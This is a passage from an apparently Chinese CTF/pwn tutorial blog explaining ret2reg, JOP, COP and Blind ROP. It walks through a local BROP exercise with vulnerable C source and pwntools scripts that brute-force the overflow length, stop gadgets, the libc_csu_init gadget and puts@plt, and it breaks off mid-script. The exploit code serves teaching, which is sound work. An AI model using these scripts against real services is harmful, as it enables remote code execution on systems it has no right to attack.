r13</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061f</span><br><span class="line">   0x40061f &lt;__libc_csu_init+95&gt;:   pop    rbp</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x0000000000400620</span><br><span class="line">   0x400620 &lt;__libc_csu_init+96&gt;:   pop    r14</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">gef➤  x/5i 0x0000000000400621</span><br><span class="line">   0x400621 &lt;__libc_csu_init+97&gt;:   pop    rsi</span><br><span class="line">   0x400622 &lt;__libc_csu_init+98&gt;:   pop    r15</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">gef➤  x/5i 0x000000000040061A+9</span><br><span class="line">   0x400623 &lt;__libc_csu_init+99&gt;:   pop    rdi</span><br><span class="line">   0x400624 &lt;__libc_csu_init+100&gt;:  ret</span><br><span class="line">   0x400625:    nop</span><br><span class="line">   0x400626:    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">   0x400630 &lt;__libc_csu_fini&gt;:  repz ret</span><br></pre></td></tr></table></figure>

<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><ul>
<li>查看溢出函数返回时哪个寄存器指向缓冲区空间</li>
<li>查找<code>call reg</code>或者<code>jmp reg</code>指令，将EIP设置为该指令地址</li>
<li>在reg指向的空间上注入shellcode（确保该空间为可执行，栈上）</li>
</ul>
<h3 id="JOP"><a href="#JOP" class="headerlink" title="JOP"></a>JOP</h3><p>JOP（Jump-Oriented Programming）：JOP利用程序中的指令片段（gadget）来构造恶意代码执行流程。与ROP类似，但是JOP使用跳转指令来控制程序的执行流程，而不是使用函数调用指令。</p>
<h3 id="COP"><a href="#COP" class="headerlink" title="COP"></a>COP</h3><p>COP（Call-Oriented Programming）：COP是ROP的进一步发展，它使用程序中的函数调用指令（call instruction）来构建恶意代码执行流程。COP利用已有的函数调用和返回代码片段，将它们组合起来形成完整的恶意操作序列</p>
<h3 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>BROP（Blind ROP）：是看不到源代码或者二进制文件情况下，对程序进行攻击，劫持程序的执行流。类似于web里面的盲注，看不到关键信息，需要一个一个地去试。</p>
<h4 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h4><ul>
<li>源程序必须存在栈溢出</li>
<li>服务器端的进程在崩溃之后能够重新启动，并且重新启动的进程的地址要与之前的地址一致（也就是说，即便有ASLR保护，那么也只是在程序最初启动的时候有效果）</li>
</ul>
<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>基本思路：</p>
<ul>
<li>判断栈溢出的长度：暴力枚举</li>
<li>Stack Reading：获取栈上的数据来泄露canary以及ebp和返回地址</li>
<li>Blind ROP：找到足够多的gadgets来控制输出的函数，并对其及进行调用，比如write函数或者puts函数</li>
<li>EXP：利用输出函数来dump出程序以便于找到更多的gadgets</li>
</ul>
<h4 id="栈溢出长度"><a href="#栈溢出长度" class="headerlink" title="栈溢出长度"></a>栈溢出长度</h4><p>暴力枚举，直到发现程序崩溃</p>
<h4 id="Stack-Reading"><a href="#Stack-Reading" class="headerlink" title="Stack Reading"></a>Stack Reading</h4><p>关于canary以及后面的变量，采用的方法一致，以canary为例进行说明。</p>
<p>枚举所有数值效率很低，可以按照字节爆破，每个字节最多有256种可能，在32位的情况下，最多爆破1024，64位最多爆破2048次</p>
<h4 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h4><p>调用函数的最简便方法就是系统调用号，但是实际上syscall几乎不可能</p>
<p>所以可以使用<code>libc_csu_init </code>结尾的一段 gadgets 来实现</p>
<h3 id="示例复现-1"><a href="#示例复现-1" class="headerlink" title="示例复现"></a>示例复现</h3><p>题目源代码：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/15PyzxeGyHXc7jHQh7A-K1A#list/path=%2F">pwn7文件|百度网盘</a>提取码：0m8j</p>
<p>C源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WelCome my friend,Do you know password?&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!check())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Do not dump my memory&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No password, no game&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">50</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strcmp</span>(buf,<span class="string">&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这道题目中，read函数有着明显的栈溢出</p>
<p>当然，实际情况是看不到源码的，这里是方便理解</p>
<p>查看保护机制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>NX保护开启，无法在栈中部署shellcode，考虑使用gadgets。实际情况下由于看不到二进制代码，所以只能暴力枚举来不断地穷举地址，判断地址是否是我们想要的。PIE没有开启，程序初始地址为0x400000</p>
<p>大致思路就是：控制put函数打印自己的GOT表地址，通过GOT地址利用LibSearch计算当前使用的libc版本，然后找到system函数和&#x2F;bin&#x2F;sh地址部署到栈中执行</p>
<h4 id="判断栈溢出空间大小"><a href="#判断栈溢出空间大小" class="headerlink" title="判断栈溢出空间大小"></a>判断栈溢出空间大小</h4><p>暴力枚举，通过循环不断增加输入的字符长度，直到程序崩溃</p>
<p>由于看不到源码，所以先找出正常情况下和程序崩溃后的两种回显，以便我们猜测出栈溢出长度</p>
<p>输入一个a，回显为“No password, no game”</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/CTF$ ./brop</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">a</span><br><span class="line">No password, no game</span><br></pre></td></tr></table></figure>

<p>输入一串长字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hno@hno-virtual-machine:~/Desktop/CTF$ cyclic 200</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">hno@hno-virtual-machine:~/Desktop/CTF$ ./brop</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>没有显示“No password, no game”，那么就可以通过不断增加字符串长度，并且根据回显结果是否有“No password, no game”来判断什么长度覆盖了返回地址，该长度减一就是栈溢出的长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getbufferflow_length</span>():</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>) </span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;WelCome my friend,Do you know password?\n&#x27;</span>)</span><br><span class="line">            sh.send(i * <span class="string">&#x27;a&#x27;</span>)       <span class="comment">#不断增加a的数量输入到程序中</span></span><br><span class="line">            output = sh.recv()		 <span class="comment">#将获取到的回显内容放在output变量中</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> output.startswith(<span class="string">&#x27;No password&#x27;</span>): </span><br><span class="line">              	<span class="comment">#判断output变量中起始位置是不是No password，如果不是说明已经溢出了</span></span><br><span class="line">                <span class="keyword">return</span> i - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:<span class="comment">#主要探测是否具有canary</span></span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">return</span> i - <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>代码的逻辑很简单，输入a到程序中，将获取到的回显内容放在output变量中，如果output变量的起始位置不是No password，那么就说明已经溢出了，这时候将a的数量减一即为栈溢出长度，否则就将a的数量加一继续输入到程序中。当发生EOFError异常时，表示可能存在Canary（用于检测缓冲区溢出的机制），这时也会返回栈溢出长度，减一即可。</p>
<p>在这道题中能够确定栈溢出的长度为72，并且根据返回信息发现没有canary保护</p>
<h4 id="寻找stop-gadget"><a href="#寻找stop-gadget" class="headerlink" title="寻找stop gadget"></a>寻找stop gadget</h4><p>由于我们不知道程序具体是什么样的，所以需要控制返回地址去猜测gadgets，当我们控制返回地址时，一般会有三种情况：</p>
<ul>
<li>程序直接崩溃：ret地址指向的是一个程序内不存在的地址</li>
<li>程序运行一段时间以后崩溃，比如运行自己构造的函数，该函数的返回地址指向不存在的地址</li>
<li>程序一直运行而不崩溃</li>
</ul>
<p>stop gadget一般指的是，当程序执行这段代码时，程序会进入无限循环，这样就使得攻击者一直保持连接状态，并且程序一直运行不崩溃，stop gadgets最后的ret地址就是程序开始的地址（main、start）</p>
<p>还是采用穷举的办法不断尝试每一个地址，从初始地址0x400000开始，通过循环不断增加地址进行尝试。</p>
<p>在执行stop gadget的时候程序会回到初始状态并且没有发生崩溃，那么可以利用这一特性，使用前面找到的72字节填满栈空间，之后接上穷举的地址，由于此时穷举的地址覆盖了ret地址，所以就可以执行穷举的地址，如果此时程序发生崩溃就进行下次循环，如果没有崩溃就将该地址输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>(<span class="params">length</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span>     <span class="comment">#尝试起始地址</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">            <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">            sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">            payload = <span class="string">&#x27;hollkdig&#x27;</span> * length + p64(addr)  <span class="comment">#输入72个字节后面加穷举地址覆盖ret</span></span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()    </span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;one success addr: 0x%x&#x27;</span> % (addr)</span><br><span class="line">            <span class="keyword">return</span> addr  <span class="comment">#由于执行代码写在了try中，所以只有程序不崩溃才能走到这一步</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            addr += <span class="number">1</span>   <span class="comment">#如果出现崩溃导致的异常，那么addr+1</span></span><br><span class="line">            sh.close()</span><br><span class="line">            </span><br><span class="line">get_stop_addr(<span class="number">9</span>)  <span class="comment">#传入72个字符串</span></span><br></pre></td></tr></table></figure>

<p>确定了stop gadget以后就可以为后面查找brop gadget、put plt、puts got做准备，运行后不崩溃的地址会有很多，当查找到第一个不崩溃的地址后可以将0x400000替换为不崩溃的地址，然后去找下一个，节约时间。接下来使用返回到源程序中的地址0x4006B6，该地址为main函数的开始地址，当然正常情况下是看不到的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004006B6</span><br><span class="line">.text:00000000004006B6 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004006B6                 public main</span><br><span class="line">.text:00000000004006B6 main            proc near               ; DATA XREF: _start+1Do</span><br><span class="line">.text:00000000004006B6                 push    rbp</span><br><span class="line">.text:00000000004006B7                 mov     rbp, rsp</span><br><span class="line">.text:00000000004006BA                 mov     rax, cs:stdin@@GLIBC_2_2_5</span><br><span class="line">.text:00000000004006C1                 mov     esi, 0          ; buf</span><br><span class="line">.text:00000000004006C6                 mov     rdi, rax        ; stream</span><br></pre></td></tr></table></figure>

<h4 id="寻找brop-gadget"><a href="#寻找brop-gadget" class="headerlink" title="寻找brop gadget"></a>寻找brop gadget</h4><p>接下来需要找到控制寄存器的gadget，我们的预想是利用put函数泄露出自己的got地址，通过got地址找到对应的libc版本，然后找到system函数和&#x2F;bin&#x2F;sh地址部署到栈中执行，所以我们需要通过gadget来控制寄存器将需要打印的内容放入寄存器内</p>
<p>在ret2csu中能够知道在<code>libc_csu_init</code>的结尾有一长串pop的gadget，其中是存在<code>pop rdi</code>的，可以利用偏移获取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">-----------------&gt;pop rsi 0x7</span><br><span class="line">-----------------&gt;pop r15</span><br><span class="line">pop     r15</span><br><span class="line">-----------------&gt;ret</span><br><span class="line">-----------------&gt;pop rdi 0x9</span><br><span class="line">-----------------&gt;ret</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>

<p>能够看到如果以pop rbx为基地址的话向下偏移0x07会得到<code>pop rsi</code>的操作，向下偏移0x09会得到<code>pop rdi</code>的操作，这两个操作就可以帮助我们控制put函数的输出内容</p>
<p>既然需要用到<code>pop rdi、pop rsi</code>的操作，那么就需要知道<code>libc_csu_init</code>结尾6个pop操作的位置，这个时候stop gadget就起到作用了，在这里定义栈上的三种地址，以便于演示stop gadget的使用</p>
<ul>
<li>Probe<ul>
<li>探针，也就是我们想要循环递增的代码地址，一般来说都是64位程序，可以直接从0x400000尝试</li>
</ul>
</li>
<li>Stop<ul>
<li>不会使程序崩溃的stop gadget的地址</li>
</ul>
</li>
<li>Trap<ul>
<li>可以导致程序崩溃的地址</li>
</ul>
</li>
</ul>
<p>可以通过在栈上拜访不同程序的stop和trap来识别出正在执行的指令</p>
<ul>
<li><p>Probe、Stop、Traps以这样的方式排列，在栈中的排列如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            |	&lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          stop             |	&lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            |	&lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>可以通过程序是否崩溃来判断Probe探针中可能存在的汇编语句，在这样的情况下，如果程序没有崩溃，就说明stop gadget被执行了，<strong>说明probe探针中没有pop 操作，并且有ret返回</strong>，如果有pop操作的话，stop会被pop到寄存器中，那么probe探针的ret返回就会指向stop的后几位traps，那么就会导致程序崩溃，由于在栈布局中的stop gadget在probe的下一位，说明stop所在位置就是probe探针的ret返回地址位置，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret</span><br><span class="line">xor eax,eax; ret</span><br></pre></td></tr></table></figure>


</li>
<li><p>Probe、Traps、Stop、Traps以这样的方式排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           ....            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          traps            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+</span><br><span class="line">|          trap             | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|          probe            | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>依旧可以通过程序是否崩溃来判断Probe探针中可能存在的汇编语句，在这样的情况下，如果程序没有崩溃，就说明stop gadget被执行了，<strong>说明probe指针中仅有一个pop操作，并且有ret返回</strong>，在probe中只有一个pop操作的时候才会只将probe后面的trap弹进寄存器，如果有两个及两个以上的pop操作时，stop gagdet也会被弹进寄存器中无法执行，并且在probe探针中ret返回所指的位置是stop才能使程序不崩溃</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop rax; ret</span><br><span class="line">pop rdi; ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>probe、trap、trap、trap、trap、trap、trap、stop、traps以这样的方式排列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------+ </span><br><span class="line">|           traps           | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           stop            | &lt;----- stop gadget，不会使程序崩溃，作为probe的ret位</span><br><span class="line">+---------------------------+ </span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- traps，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           trap            | &lt;----- trap，程序中不存在的地址，当IP指针指向该处时崩溃</span><br><span class="line">+---------------------------+</span><br><span class="line">|           probe           | &lt;----- 探针</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<p>依旧可以通过程序是否崩溃来判断probe探针中可能存在的汇编语句，在这样的布局下，如果程序没有崩溃，说明stop gadget被执行了，<strong>说明该probe探针存在6个pop操作，并且有ret</strong>，因为只有在6个pop操作之后的probe后面的trap才能弹进寄存器，之后sp指针才能指向stop gagdet，这个时候stop gadget只有在ret位置才能被执行，因此程序不会崩溃</p>
</li>
</ul>
<p>前面说我们要找的就是<code>libc_csu_init</code>最后的6个pop加ret，那么根据我们前面的分析可以对trap、stop进行排列：</p>
<p><code>addr, trap, trap, trap, trap, trap, trap, stop, trap</code></p>
<p>以如上排列，addr通过循环不断增加地址位，只有addr所在地址拥有6个pop操作并ret的时候才会执行stop gadget</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_brop_gadget</span>(<span class="params">length, stop_gadget, addr</span>): <span class="comment">#查找brop gadget函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + p64(h) + p64(o) + p64(l) + p64(l) + p64(k) + p64(<span class="number">0</span>) + p64(stop_gadget) + p64(h) + p64(o) + p64(l) + p64(l) + p64(k) </span><br><span class="line"><span class="comment">#通过72个a填满栈空间到ret，增长的地址覆盖原有的ret地址，接着用6个字符的p64形式充当trap，最后接上stop</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="built_in">print</span> content</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> content.startswith(<span class="string">&#x27;WelCome&#x27;</span>):</span><br><span class="line">          <span class="comment">#判断提示符是否出现起始提示字符，如果有说明程序没崩溃</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_brop_gadget</span>(<span class="params">length, addr</span>):<span class="comment">#检查地址</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;,.brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;a&#x27;</span> * length + p64(addr) + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> * <span class="number">10</span></span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##length = getbufferflow_length()</span></span><br><span class="line">length = <span class="number">72</span></span><br><span class="line"><span class="comment">##get_stop_addr(length)</span></span><br><span class="line">stop_gadget = <span class="number">0x4006b6</span></span><br><span class="line">addr = <span class="number">0x400740</span> </span><br><span class="line"><span class="comment">#理论上应该从0x400000开始寻找，但是这个环节要找的是Libc_csu_init函数，所以大多数的libc中Libc_csu_init函数的起始地址都在0x400740之后，所以为了减少误差，从0x400740开始</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:  <span class="comment">#循环递增要测试的地址</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">    <span class="keyword">if</span> get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;possible brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">        <span class="keyword">if</span> check_brop_gadget(length, addr):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;success brop gadget: 0x%x&#x27;</span> % addr</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>运行后会得到很多的gadget地址，但是只有<code>0x4007ba</code>是可以进行操作的，可以使用IDA看一下该地址的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004007BA                 pop     rbx</span><br><span class="line">.text:00000000004007BB                 pop     rbp</span><br><span class="line">.text:00000000004007BC                 pop     r12</span><br><span class="line">.text:00000000004007BE                 pop     r13</span><br><span class="line">.text:00000000004007C0                 pop     r14</span><br><span class="line">.text:00000000004007C2                 pop     r15</span><br><span class="line">.text:00000000004007C4                 retn</span><br></pre></td></tr></table></figure>

<p>栈中布局：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">             +---------------------------+</span><br><span class="line">             |       			 0    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       	   .....           |   | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 0    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       	stop gadget        | stop gadget作为ret返回地址</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 0    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 k    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 l    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 l    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 o    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |       			 h    	       | trap</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |         0x400740+         | 递增地址覆盖原ret返回位置</span><br><span class="line">             +---------------------------+</span><br><span class="line">             |             a             | a字符串覆盖原saved ebp位置</span><br><span class="line">      ebp---&gt;+---------------------------+</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |           ....            |        .....</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">             |             a             | a字符串占位填满栈空间</span><br><span class="line">ebp-？--&gt;+---------------------------+</span><br></pre></td></tr></table></figure>

<p>得到brop gadget后加上<code>0x9</code>的偏移就可以得到<code>pop rdi; ret</code>的操作地址<code>0x4007c3</code></p>
<h4 id="寻找puts-plt地址"><a href="#寻找puts-plt地址" class="headerlink" title="寻找puts@plt地址"></a>寻找puts@plt地址</h4><p>通过前面的操作可以总结出来一些规律，比如需要什么就把他丢到循环里，通过递增总会得到想要的结果，在上一步我们找到了<code>pop rdi; ret</code>这个gadget地址了，那么我们可以控制puts函数的输出内容，所以需要用这个gadget找到puts_plt的地址。前面说过，想要调用puts函数，必须将puts函数的参数地址先部署到rdi寄存器内，然后调用puts函数将rdi中地址内的参数打印出来</p>
<p>但是由于开启了NX保护，所以我们无法在栈中部署外部的变量或者字符串，那么就需要一个程序内部的特殊字符串，这个字符串必须是唯一的，在没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为<code>&#39;\x7fELF&#39;</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_addr</span>(<span class="params">length, rdi_ret, stop_gadget</span>):</span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        <span class="comment">#sh = process(&#x27;./brop&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;password?\n&#x27;</span>)</span><br><span class="line">        payload = <span class="string">&#x27;A&#x27;</span> * length + p64(rdi_ret) + p64(<span class="number">0x400000</span>) + p64(</span><br><span class="line">            addr) + 